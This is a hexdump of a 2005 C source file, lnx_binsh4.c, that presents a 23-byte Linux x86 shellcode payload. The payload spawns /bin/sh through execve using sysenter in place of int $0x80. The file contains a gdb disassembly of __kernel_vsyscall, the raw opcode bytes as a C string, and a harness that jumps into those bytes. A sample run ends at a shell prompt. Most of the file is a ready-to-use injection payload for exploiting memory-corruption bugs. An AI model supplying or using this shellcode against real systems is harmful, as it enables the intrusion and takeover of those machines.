00000000  2f 2a 0d 0a 20 6c 6e 78  5f 62 69 6e 73 68 34 2e  |/*.. lnx_binsh4.|
00000010  63 20 2d 20 76 31 20 2d  20 32 33 20 42 79 74 65  |c - v1 - 23 Byte|
00000020  20 2f 62 69 6e 2f 73 68  20 73 79 73 65 6e 74 65  | /bin/sh sysente|
00000030  72 20 4f 70 63 6f 64 65  20 41 72 72 61 79 20 50  |r Opcode Array P|
00000040  61 79 6c 6f 61 64 0d 0a  20 43 6f 70 79 72 69 67  |ayload.. Copyrig|
00000050  68 74 28 63 29 20 32 30  30 35 20 63 30 6e 74 65  |ht(c) 2005 c0nte|
00000060  78 20 3c 63 30 6e 74 65  78 40 6f 70 65 6e 2d 73  |x <c0ntex@open-s|
00000070  65 63 75 72 69 74 79 2e  6f 72 67 3e 0d 0a 20 43  |ecurity.org>.. C|
00000080  6f 70 79 72 69 67 68 74  28 63 29 20 32 30 30 35  |opyright(c) 2005|
00000090  20 42 61 43 6b 53 70 41  63 45 20 3c 73 69 6e 69  | BaCkSpAcE <sini|
000000a0  73 61 38 36 40 67 6d 61  69 6c 2e 63 6f 6d 3e 0d  |sa86@gmail.com>.|
000000b0  0a 0d 0a 20 54 68 69 73  20 70 72 6f 67 72 61 6d  |... This program|
000000c0  20 69 73 20 66 72 65 65  20 73 6f 66 74 77 61 72  | is free softwar|
000000d0  65 3b 20 79 6f 75 20 63  61 6e 20 72 65 64 69 73  |e; you can redis|
000000e0  74 72 69 62 75 74 65 20  69 74 20 61 6e 64 2f 6f  |tribute it and/o|
000000f0  72 20 6d 6f 64 69 66 79  0d 0a 20 69 74 20 75 6e  |r modify.. it un|
00000100  64 65 72 20 74 68 65 20  74 65 72 6d 73 20 6f 66  |der the terms of|
00000110  20 74 68 65 20 47 4e 55  20 47 65 6e 65 72 61 6c  | the GNU General|
00000120  20 50 75 62 6c 69 63 20  4c 69 63 65 6e 73 65 20  | Public License |
00000130  61 73 20 70 75 62 6c 69  73 68 65 64 20 62 79 0d  |as published by.|
00000140  0a 20 74 68 65 20 46 72  65 65 20 53 6f 66 74 77  |. the Free Softw|
00000150  61 72 65 20 46 6f 75 6e  64 61 74 69 6f 6e 3b 20  |are Foundation; |
00000160  65 69 74 68 65 72 20 76  65 72 73 69 6f 6e 20 32  |either version 2|
00000170  20 6f 66 20 74 68 65 20  4c 69 63 65 6e 73 65 2c  | of the License,|
00000180  20 6f 72 0d 0a 20 28 61  74 20 79 6f 75 72 20 6f  | or.. (at your o|
00000190  70 74 69 6f 6e 29 20 61  6e 79 20 6c 61 74 65 72  |ption) any later|
000001a0  20 76 65 72 73 69 6f 6e  2e 0d 0a 0d 0a 20 54 68  | version..... Th|
000001b0  69 73 20 70 72 6f 67 72  61 6d 20 69 73 20 64 69  |is program is di|
000001c0  73 74 72 69 62 75 74 65  64 20 69 6e 20 74 68 65  |stributed in the|
000001d0  20 68 6f 70 65 20 74 68  61 74 20 69 74 20 77 69  | hope that it wi|
000001e0  6c 6c 20 62 65 20 75 73  65 66 75 6c 2c 0d 0a 20  |ll be useful,.. |
000001f0  62 75 74 20 57 49 54 48  4f 55 54 20 41 4e 59 20  |but WITHOUT ANY |
00000200  57 41 52 52 41 4e 54 59  3b 20 77 69 74 68 6f 75  |WARRANTY; withou|
00000210  74 20 65 76 65 6e 20 74  68 65 20 69 6d 70 6c 69  |t even the impli|
00000220  65 64 20 77 61 72 72 61  6e 74 79 20 6f 66 0d 0a  |ed warranty of..|
00000230  20 4d 45 52 43 48 41 4e  54 41 42 49 4c 49 54 59  | MERCHANTABILITY|
00000240  20 6f 72 20 46 49 54 4e  45 53 53 20 46 4f 52 20  | or FITNESS FOR |
00000250  41 20 50 41 52 54 49 43  55 4c 41 52 20 50 55 52  |A PARTICULAR PUR|
00000260  50 4f 53 45 2e 20 20 53  65 65 20 74 68 65 0d 0a  |POSE.  See the..|
00000270  20 47 4e 55 20 47 65 6e  65 72 61 6c 20 50 75 62  | GNU General Pub|
00000280  6c 69 63 20 4c 69 63 65  6e 73 65 20 66 6f 72 20  |lic License for |
00000290  6d 6f 72 65 20 64 65 74  61 69 6c 73 2e 0d 0a 0d  |more details....|
000002a0  0a 20 59 6f 75 20 73 68  6f 75 6c 64 20 68 61 76  |. You should hav|
000002b0  65 20 72 65 63 65 69 76  65 64 20 61 20 63 6f 70  |e received a cop|
000002c0  79 20 6f 66 20 74 68 65  20 47 4e 55 20 47 65 6e  |y of the GNU Gen|
000002d0  65 72 61 6c 20 50 75 62  6c 69 63 20 4c 69 63 65  |eral Public Lice|
000002e0  6e 73 65 0d 0a 20 61 6c  6f 6e 67 20 77 69 74 68  |nse.. along with|
000002f0  20 74 68 69 73 20 70 72  6f 67 72 61 6d 3b 20 69  | this program; i|
00000300  66 20 6e 6f 74 2c 20 77  72 69 74 65 20 74 6f 20  |f not, write to |
00000310  74 68 65 20 46 72 65 65  20 53 6f 66 74 77 61 72  |the Free Softwar|
00000320  65 0d 0a 20 46 6f 75 6e  64 61 74 69 6f 6e 2c 20  |e.. Foundation, |
00000330  49 6e 63 2e 2c 20 35 39  20 54 65 6d 70 6c 65 20  |Inc., 59 Temple |
00000340  50 6c 61 63 65 2c 20 53  75 69 74 65 20 33 33 30  |Place, Suite 330|
00000350  2c 20 42 6f 73 74 6f 6e  2c 0d 0a 20 4d 41 20 20  |, Boston,.. MA  |
00000360  30 32 31 31 31 2d 31 33  30 37 20 20 55 53 41 0d  |02111-1307  USA.|
00000370  0a 0d 0a 2a 2f 0d 0a 0d  0a 2f 2a 0d 0a 0d 0a 54  |...*/..../*....T|
00000380  65 73 74 65 64 3a 20 66  65 64 6f 72 61 20 63 6f  |ested: fedora co|
00000390  72 65 20 33 20 2d 20 63  30 6e 74 65 78 0d 0a 09  |re 3 - c0ntex...|
000003a0  66 65 64 6f 72 61 20 63  6f 72 65 20 34 20 2d 20  |fedora core 4 - |
000003b0  42 61 43 6b 53 70 41 63  45 0d 0a 20 20 20 20 20  |BaCkSpAcE..     |
000003c0  20 20 20 64 65 62 69 61  6e 20 53 49 44 20 2d 20  |   debian SID - |
000003d0  61 6d 6e 65 73 69 61 0d  0a 0d 0a 65 78 65 63 76  |amnesia....execv|
000003e0  65 28 22 2f 62 69 6e 2f  73 68 22 29 20 75 73 69  |e("/bin/sh") usi|
000003f0  6e 67 20 73 79 73 65 6e  74 65 72 20 66 72 6f 6d  |ng sysenter from|
00000400  20 5f 5f 6b 65 72 6e 65  6c 5f 76 73 79 73 63 61  | __kernel_vsysca|
00000410  6c 6c 20 61 70 70 6f 73  65 20 74 6f 20 69 6e 74  |ll appose to int|
00000420  20 24 30 78 38 30 0d 0a  0d 0a 28 67 64 62 29 20  | $0x80....(gdb) |
00000430  64 69 73 61 73 20 5f 5f  6b 65 72 6e 65 6c 5f 76  |disas __kernel_v|
00000440  73 79 73 63 61 6c 6c 0d  0a 44 75 6d 70 20 6f 66  |syscall..Dump of|
00000450  20 61 73 73 65 6d 62 6c  65 72 20 63 6f 64 65 20  | assembler code |
00000460  66 6f 72 20 66 75 6e 63  74 69 6f 6e 20 5f 5f 6b  |for function __k|
00000470  65 72 6e 65 6c 5f 76 73  79 73 63 61 6c 6c 3a 0d  |ernel_vsyscall:.|
00000480  0a 30 78 66 66 66 66 65  34 30 30 20 3c 5f 5f 6b  |.0xffffe400 <__k|
00000490  65 72 6e 65 6c 5f 76 73  79 73 63 61 6c 6c 2b 30  |ernel_vsyscall+0|
000004a0  3e 3a 20 20 20 20 20 20  20 70 75 73 68 20 20 20  |>:       push   |
000004b0  25 65 63 78 0d 0a 30 78  66 66 66 66 65 34 30 31  |%ecx..0xffffe401|
000004c0  20 3c 5f 5f 6b 65 72 6e  65 6c 5f 76 73 79 73 63  | <__kernel_vsysc|
000004d0  61 6c 6c 2b 31 3e 3a 20  20 20 20 20 20 20 70 75  |all+1>:       pu|
000004e0  73 68 20 20 20 25 65 64  78 0d 0a 30 78 66 66 66  |sh   %edx..0xfff|
000004f0  66 65 34 30 32 20 3c 5f  5f 6b 65 72 6e 65 6c 5f  |fe402 <__kernel_|
00000500  76 73 79 73 63 61 6c 6c  2b 32 3e 3a 20 20 20 20  |vsyscall+2>:    |
00000510  20 20 20 70 75 73 68 20  20 20 25 65 62 70 0d 0a  |   push   %ebp..|
00000520  30 78 66 66 66 66 65 34  30 33 20 3c 5f 5f 6b 65  |0xffffe403 <__ke|
00000530  72 6e 65 6c 5f 76 73 79  73 63 61 6c 6c 2b 33 3e  |rnel_vsyscall+3>|
00000540  3a 20 20 20 20 20 20 20  6d 6f 76 20 20 20 20 25  |:       mov    %|
00000550  65 73 70 2c 25 65 62 70  0d 0a 30 78 66 66 66 66  |esp,%ebp..0xffff|
00000560  65 34 30 35 20 3c 5f 5f  6b 65 72 6e 65 6c 5f 76  |e405 <__kernel_v|
00000570  73 79 73 63 61 6c 6c 2b  35 3e 3a 20 20 20 20 20  |syscall+5>:     |
00000580  20 20 73 79 73 65 6e 74  65 72 0d 0a 30 78 66 66  |  sysenter..0xff|
00000590  66 66 65 34 30 37 20 3c  5f 5f 6b 65 72 6e 65 6c  |ffe407 <__kernel|
000005a0  5f 76 73 79 73 63 61 6c  6c 2b 37 3e 3a 20 20 20  |_vsyscall+7>:   |
000005b0  20 20 20 20 6e 6f 70 0d  0a 30 78 66 66 66 66 65  |    nop..0xffffe|
000005c0  34 30 38 20 3c 5f 5f 6b  65 72 6e 65 6c 5f 76 73  |408 <__kernel_vs|
000005d0  79 73 63 61 6c 6c 2b 38  3e 3a 20 20 20 20 20 20  |yscall+8>:      |
000005e0  20 6e 6f 70 0d 0a 30 78  66 66 66 66 65 34 30 39  | nop..0xffffe409|
000005f0  20 3c 5f 5f 6b 65 72 6e  65 6c 5f 76 73 79 73 63  | <__kernel_vsysc|
00000600  61 6c 6c 2b 39 3e 3a 20  20 20 20 20 20 20 6e 6f  |all+9>:       no|
00000610  70 0d 0a 30 78 66 66 66  66 65 34 30 61 20 3c 5f  |p..0xffffe40a <_|
00000620  5f 6b 65 72 6e 65 6c 5f  76 73 79 73 63 61 6c 6c  |_kernel_vsyscall|
00000630  2b 31 30 3e 3a 20 20 20  20 20 20 6e 6f 70 0d 0a  |+10>:      nop..|
00000640  30 78 66 66 66 66 65 34  30 62 20 3c 5f 5f 6b 65  |0xffffe40b <__ke|
00000650  72 6e 65 6c 5f 76 73 79  73 63 61 6c 6c 2b 31 31  |rnel_vsyscall+11|
00000660  3e 3a 20 20 20 20 20 20  6e 6f 70 0d 0a 30 78 66  |>:      nop..0xf|
00000670  66 66 66 65 34 30 63 20  3c 5f 5f 6b 65 72 6e 65  |fffe40c <__kerne|
00000680  6c 5f 76 73 79 73 63 61  6c 6c 2b 31 32 3e 3a 20  |l_vsyscall+12>: |
00000690  20 20 20 20 20 6e 6f 70  0d 0a 30 78 66 66 66 66  |     nop..0xffff|
000006a0  65 34 30 64 20 3c 5f 5f  6b 65 72 6e 65 6c 5f 76  |e40d <__kernel_v|
000006b0  73 79 73 63 61 6c 6c 2b  31 33 3e 3a 20 20 20 20  |syscall+13>:    |
000006c0  20 20 6e 6f 70 0d 0a 30  78 66 66 66 66 65 34 30  |  nop..0xffffe40|
000006d0  65 20 3c 5f 5f 6b 65 72  6e 65 6c 5f 76 73 79 73  |e <__kernel_vsys|
000006e0  63 61 6c 6c 2b 31 34 3e  3a 20 20 20 20 20 20 6a  |call+14>:      j|
000006f0  6d 70 20 20 20 20 30 78  66 66 66 66 65 34 30 33  |mp    0xffffe403|
00000700  20 3c 5f 5f 6b 65 72 6e  65 6c 5f 76 73 79 73 63  | <__kernel_vsysc|
00000710  61 6c 6c 2b 33 3e 0d 0a  30 78 66 66 66 66 65 34  |all+3>..0xffffe4|
00000720  31 30 20 3c 5f 5f 6b 65  72 6e 65 6c 5f 76 73 79  |10 <__kernel_vsy|
00000730  73 63 61 6c 6c 2b 31 36  3e 3a 20 20 20 20 20 20  |scall+16>:      |
00000740  70 6f 70 20 20 20 20 25  65 62 70 0d 0a 30 78 66  |pop    %ebp..0xf|
00000750  66 66 66 65 34 31 31 20  3c 5f 5f 6b 65 72 6e 65  |fffe411 <__kerne|
00000760  6c 5f 76 73 79 73 63 61  6c 6c 2b 31 37 3e 3a 20  |l_vsyscall+17>: |
00000770  20 20 20 20 20 70 6f 70  20 20 20 20 25 65 64 78  |     pop    %edx|
00000780  0d 0a 30 78 66 66 66 66  65 34 31 32 20 3c 5f 5f  |..0xffffe412 <__|
00000790  6b 65 72 6e 65 6c 5f 76  73 79 73 63 61 6c 6c 2b  |kernel_vsyscall+|
000007a0  31 38 3e 3a 20 20 20 20  20 20 70 6f 70 20 20 20  |18>:      pop   |
000007b0  20 25 65 63 78 0d 0a 30  78 66 66 66 66 65 34 31  | %ecx..0xffffe41|
000007c0  33 20 3c 5f 5f 6b 65 72  6e 65 6c 5f 76 73 79 73  |3 <__kernel_vsys|
000007d0  63 61 6c 6c 2b 31 39 3e  3a 20 20 20 20 20 20 72  |call+19>:      r|
000007e0  65 74 0d 0a 30 78 66 66  66 66 65 34 31 34 20 3c  |et..0xffffe414 <|
000007f0  5f 5f 6b 65 72 6e 65 6c  5f 76 73 79 73 63 61 6c  |__kernel_vsyscal|
00000800  6c 2b 32 30 3e 3a 20 20  20 20 20 20 61 64 64 20  |l+20>:      add |
00000810  20 20 20 25 61 6c 2c 28  25 65 61 78 29 0d 0a 30  |   %al,(%eax)..0|
00000820  78 66 66 66 66 65 34 31  36 20 3c 5f 5f 6b 65 72  |xffffe416 <__ker|
00000830  6e 65 6c 5f 76 73 79 73  63 61 6c 6c 2b 32 32 3e  |nel_vsyscall+22>|
00000840  3a 20 20 20 20 20 20 61  64 64 20 20 20 20 25 61  |:      add    %a|
00000850  6c 2c 28 25 65 61 78 29  0d 0a 30 78 66 66 66 66  |l,(%eax)..0xffff|
00000860  65 34 31 38 20 3c 5f 5f  6b 65 72 6e 65 6c 5f 76  |e418 <__kernel_v|
00000870  73 79 73 63 61 6c 6c 2b  32 34 3e 3a 20 20 20 20  |syscall+24>:    |
00000880  20 20 61 64 64 20 20 20  20 25 61 6c 2c 28 25 65  |  add    %al,(%e|
00000890  61 78 29 0d 0a 30 78 66  66 66 66 65 34 31 61 20  |ax)..0xffffe41a |
000008a0  3c 5f 5f 6b 65 72 6e 65  6c 5f 76 73 79 73 63 61  |<__kernel_vsysca|
000008b0  6c 6c 2b 32 36 3e 3a 20  20 20 20 20 20 61 64 64  |ll+26>:      add|
000008c0  20 20 20 20 25 61 6c 2c  28 25 65 61 78 29 0d 0a  |    %al,(%eax)..|
000008d0  30 78 66 66 66 66 65 34  31 63 20 3c 5f 5f 6b 65  |0xffffe41c <__ke|
000008e0  72 6e 65 6c 5f 76 73 79  73 63 61 6c 6c 2b 32 38  |rnel_vsyscall+28|
000008f0  3e 3a 20 20 20 20 20 20  61 64 64 20 20 20 20 25  |>:      add    %|
00000900  61 6c 2c 28 25 65 61 78  29 0d 0a 30 78 66 66 66  |al,(%eax)..0xfff|
00000910  66 65 34 31 65 20 3c 5f  5f 6b 65 72 6e 65 6c 5f  |fe41e <__kernel_|
00000920  76 73 79 73 63 61 6c 6c  2b 33 30 3e 3a 20 20 20  |vsyscall+30>:   |
00000930  20 20 20 61 64 64 20 20  20 20 25 61 6c 2c 28 25  |   add    %al,(%|
00000940  65 61 78 29 0d 0a 45 6e  64 20 6f 66 20 61 73 73  |eax)..End of ass|
00000950  65 6d 62 6c 65 72 20 64  75 6d 70 2e 0d 0a 28 67  |embler dump...(g|
00000960  64 62 29 20 71 0d 0a 0d  0a 73 6f 20 77 65 20 72  |db) q....so we r|
00000970  65 70 6c 61 63 65 0d 0a  0d 0a 69 6e 74 20 24 30  |eplace....int $0|
00000980  78 38 30 0d 0a 0d 0a 69  6e 73 74 72 75 63 74 69  |x80....instructi|
00000990  6f 6e 20 77 69 74 68 0d  0a 0d 0a 70 75 73 68 20  |on with....push |
000009a0  20 20 25 65 63 78 0d 0a  70 75 73 68 20 20 20 25  |  %ecx..push   %|
000009b0  65 64 78 0d 0a 70 75 73  68 20 20 20 25 65 62 70  |edx..push   %ebp|
000009c0  0d 0a 6d 6f 76 20 20 20  20 25 65 73 70 2c 25 65  |..mov    %esp,%e|
000009d0  62 70 0d 0a 73 79 73 65  6e 74 65 72 0d 0a 0d 0a  |bp..sysenter....|
000009e0  77 68 69 63 68 20 64 6f  65 73 20 6d 61 6b 65 20  |which does make |
000009f0  74 68 65 20 73 68 65 6c  6c 63 6f 64 65 20 73 6c  |the shellcode sl|
00000a00  69 67 68 74 6c 79 20 6c  61 72 67 65 72 20 20 3a  |ightly larger  :|
00000a10  2f 0d 0a 0d 0a 0d 0a 20  38 30 34 38 30 37 61 3a  |/...... 804807a:|
00000a20  20 20 20 20 20 20 20 35  31 20 20 20 20 20 20 20  |       51       |
00000a30  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 70  |               p|
00000a40  75 73 68 20 20 20 25 65  63 78 0d 0a 20 38 30 34  |ush   %ecx.. 804|
00000a50  38 30 37 62 3a 20 20 20  20 20 20 20 35 32 20 20  |807b:       52  |
00000a60  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000a70  20 20 20 20 70 75 73 68  20 20 20 25 65 64 78 0d  |    push   %edx.|
00000a80  0a 20 38 30 34 38 30 37  63 3a 20 20 20 20 20 20  |. 804807c:      |
00000a90  20 35 35 20 20 20 20 20  20 20 20 20 20 20 20 20  | 55             |
00000aa0  20 20 20 20 20 20 20 20  20 70 75 73 68 20 20 20  |         push   |
00000ab0  25 65 62 70 0d 0a 20 38  30 34 38 30 37 64 3a 20  |%ebp.. 804807d: |
00000ac0  20 20 20 20 20 20 38 39  20 65 35 20 20 20 20 20  |      89 e5     |
00000ad0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 6d 6f  |              mo|
00000ae0  76 20 20 20 20 25 65 73  70 2c 25 65 62 70 0d 0a  |v    %esp,%ebp..|
00000af0  20 38 30 34 38 30 37 66  3a 20 20 20 20 20 20 20  | 804807f:       |
00000b00  30 66 20 33 34 20 20 20  20 20 20 20 20 20 20 20  |0f 34           |
00000b10  20 20 20 20 20 20 20 20  73 79 73 65 6e 74 65 72  |        sysenter|
00000b20  0d 0a 0d 0a 20 24 20 2e  2f 6c 6e 78 5f 62 69 6e  |.... $ ./lnx_bin|
00000b30  73 68 34 0d 0a 0d 0a 20  5b 2d 5d 20 53 74 61 63  |sh4.... [-] Stac|
00000b40  6b 20 50 6f 69 6e 74 65  72 20 66 6f 75 6e 64 20  |k Pointer found |
00000b50  2d 3e 20 5b 30 78 62 66  65 30 66 30 64 38 5d 0d  |-> [0xbfe0f0d8].|
00000b60  0a 20 20 20 20 20 20 20  20 20 5b 2d 5d 20 53 69  |.         [-] Si|
00000b70  7a 65 20 6f 66 20 70 61  79 6c 6f 61 64 20 65 67  |ze of payload eg|
00000b80  67 20 2d 3e 20 5b 32 33  5d 0d 0a 09 20 5b 2d 5d  |g -> [23]... [-]|
00000b90  20 50 61 79 6c 6f 61 64  20 42 65 67 69 6e 20 2d  | Payload Begin -|
00000ba0  3e 20 5b 30 78 38 30 34  39 36 63 30 5d 0d 0a 09  |> [0x80496c0]...|
00000bb0  20 5b 2d 5d 20 50 61 79  6c 6f 61 64 20 45 6e 64  | [-] Payload End|
00000bc0  20 20 20 2d 3e 20 5b 30  78 38 30 34 39 36 64 37  |   -> [0x80496d7|
00000bd0  5d 0d 0a 0d 0a 20 73 68  2d 33 2e 30 30 62 24 0d  |].... sh-3.00b$.|
00000be0  0a 0d 0a 2a 2f 0d 0a 0d  0a 2f 2a 0d 0a 20 43 61  |...*/..../*.. Ca|
00000bf0  6c 6c 69 6e 67 3a 20 65  78 65 63 76 65 28 2f 62  |lling: execve(/b|
00000c00  69 6e 2f 73 68 29 2c 20  65 78 69 74 28 30 29 0d  |in/sh), exit(0).|
00000c10  0a 2a 2f 0d 0a 0d 0a 0d  0a 23 69 6e 63 6c 75 64  |.*/......#includ|
00000c20  65 20 3c 73 74 64 69 6f  2e 68 3e 0d 0a 0d 0a 74  |e <stdio.h>....t|
00000c30  79 70 65 64 65 66 20 63  68 61 72 20 77 69 6b 6b  |ypedef char wikk|
00000c40  69 64 3b 0d 0a 0d 0a 2f  2a 20 72 65 64 75 63 65  |id;..../* reduce|
00000c50  64 20 73 68 65 6c 6c 63  6f 64 65 20 73 69 7a 65  |d shellcode size|
00000c60  20 66 72 6f 6d 20 34 35  20 74 6f 20 32 33 20 2d  | from 45 to 23 -|
00000c70  20 42 61 43 6b 53 70 41  63 45 20 2a 2f 0d 0a 77  | BaCkSpAcE */..w|
00000c80  69 6b 6b 69 64 20 6f 50  63 30 64 33 7a 5b 5d 20  |ikkid oPc0d3z[] |
00000c90  3d 20 22 5c 78 36 61 5c  78 30 62 5c 78 35 38 5c  |= "\x6a\x0b\x58\|
00000ca0  78 39 39 5c 78 35 32 5c  78 36 38 5c 78 32 66 5c  |x99\x52\x68\x2f\|
00000cb0  78 32 66 22 0d 0a 20 20  20 20 20 20 20 20 20 20  |x2f"..          |
00000cc0  20 20 20 20 20 20 20 20  20 22 5c 78 37 33 5c 78  |         "\x73\x|
00000cd0  36 38 5c 78 36 38 5c 78  32 66 5c 78 36 32 5c 78  |68\x68\x2f\x62\x|
00000ce0  36 39 5c 78 36 65 5c 78  35 34 22 0d 0a 20 20 20  |69\x6e\x54"..   |
00000cf0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000d00  22 5c 78 35 62 5c 78 35  32 5c 78 35 33 5c 78 35  |"\x5b\x52\x53\x5|
00000d10  34 5c 78 35 39 5c 78 30  66 5c 78 33 34 22 3b 0d  |4\x59\x0f\x34";.|
00000d20  0a 0d 0a 75 6e 73 69 67  6e 65 64 20 6c 6f 6e 67  |...unsigned long|
00000d30  20 67 72 61 62 5f 65 73  70 28 29 0d 0a 7b 0d 0a  | grab_esp()..{..|
00000d40  09 09 5f 5f 61 73 6d 5f  5f 28 22 6d 6f 76 6c 20  |..__asm__("movl |
00000d50  25 65 73 70 2c 25 65 61  78 22 29 3b 0d 0a 7d 0d  |%esp,%eax");..}.|
00000d60  0a 0d 0a 69 6e 74 20 6d  61 69 6e 28 76 6f 69 64  |...int main(void|
00000d70  29 0d 0a 7b 0d 0a 09 75  6e 73 69 67 6e 65 64 20  |)..{...unsigned |
00000d80  6c 6f 6e 67 20 64 65 6c  74 61 3b 0d 0a 09 76 6f  |long delta;...vo|
00000d90  69 64 20 28 2a 70 6f 69  6e 74 65 72 29 28 29 3b  |id (*pointer)();|
00000da0  0d 0a 0d 0a 09 64 65 6c  74 61 20 3d 20 67 72 61  |.....delta = gra|
00000db0  62 5f 65 73 70 28 29 3b  0d 0a 0d 0a 09 66 70 72  |b_esp();.....fpr|
00000dc0  69 6e 74 66 28 73 74 64  65 72 72 2c 20 22 5c 6e  |intf(stderr, "\n|
00000dd0  5b 2d 5d 20 53 74 61 63  6b 20 50 6f 69 6e 74 65  |[-] Stack Pointe|
00000de0  72 20 66 6f 75 6e 64 20  2d 3e 20 5b 30 78 25 78  |r found -> [0x%x|
00000df0  5d 5c 6e 22 2c 20 64 65  6c 74 61 29 3b 0d 0a 09  |]\n", delta);...|
00000e00  66 70 72 69 6e 74 66 28  73 74 64 65 72 72 2c 20  |fprintf(stderr, |
00000e10  22 5c 74 5b 2d 5d 20 53  69 7a 65 20 6f 66 20 70  |"\t[-] Size of p|
00000e20  61 79 6c 6f 61 64 20 65  67 67 20 2d 3e 20 5b 25  |ayload egg -> [%|
00000e30  64 5d 5c 6e 22 2c 20 73  69 7a 65 6f 66 28 6f 50  |d]\n", sizeof(oP|
00000e40  63 30 64 33 7a 29 2d 31  29 3b 0d 0a 0d 0a 09 70  |c0d3z)-1);.....p|
00000e50  6f 69 6e 74 65 72 3d 28  76 6f 69 64 2a 29 26 6f  |ointer=(void*)&o|
00000e60  50 63 30 64 33 7a 3b 0d  0a 0d 0a 09 77 68 69 6c  |Pc0d3z;.....whil|
00000e70  65 28 70 6f 69 6e 74 65  72 29 20 7b 0d 0a 09 09  |e(pointer) {....|
00000e80  66 70 72 69 6e 74 66 28  73 74 64 65 72 72 2c 20  |fprintf(stderr, |
00000e90  22 5c 74 5b 2d 5d 20 50  61 79 6c 6f 61 64 20 42  |"\t[-] Payload B|
00000ea0  65 67 69 6e 20 2d 3e 20  5b 30 78 25 78 5d 5c 6e  |egin -> [0x%x]\n|
00000eb0  22 2c 20 70 6f 69 6e 74  65 72 29 3b 0d 0a 09 09  |", pointer);....|
00000ec0  66 70 72 69 6e 74 66 28  73 74 64 65 72 72 2c 20  |fprintf(stderr, |
00000ed0  22 5c 74 5b 2d 5d 20 50  61 79 6c 6f 61 64 20 45  |"\t[-] Payload E|
00000ee0  6e 64 20 20 20 2d 3e 20  5b 30 78 25 78 5d 5c 6e  |nd   -> [0x%x]\n|
00000ef0  5c 6e 22 2c 20 70 6f 69  6e 74 65 72 2b 32 33 29  |\n", pointer+23)|
00000f00  3b 0d 0a 09 09 70 6f 69  6e 74 65 72 28 29 3b 0d  |;....pointer();.|
00000f10  0a 09 7d 0d 0a 0d 0a 09  5f 65 78 69 74 28 30 29  |..}....._exit(0)|
00000f20  3b 0d 0a 7d                                       |;..}|
00000f24
